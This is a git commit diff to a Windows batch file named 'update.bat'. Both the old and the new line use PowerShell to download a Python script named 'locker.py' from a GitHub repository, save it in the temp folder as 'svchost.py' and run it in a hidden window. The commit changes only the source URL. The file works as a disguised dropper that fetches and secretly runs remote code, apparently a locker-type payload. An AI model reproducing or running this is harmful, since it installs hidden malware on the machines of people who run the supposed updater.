56f07e721436b09357fc4eaa818915e3a0d5b40c
A3 <www.achua6@gmail.com>
2026-07-29 22:17:25 +0530

    Update update.bat

--- update.bat
+++ update.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell -Command "& {Invoke-WebRequest -Uri 'https://github.com/R0TA3/locker/raw/main/locker.py' -OutFile '%TEMP%\svchost.py'; Start-Process python -ArgumentList '%TEMP%\svchost.py' -WindowStyle Hidden}"
+powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.py' -OutFile '%TEMP%\svchost.py'; Start-Process python -ArgumentList '%TEMP%\svchost.py' -WindowStyle Hidden}"
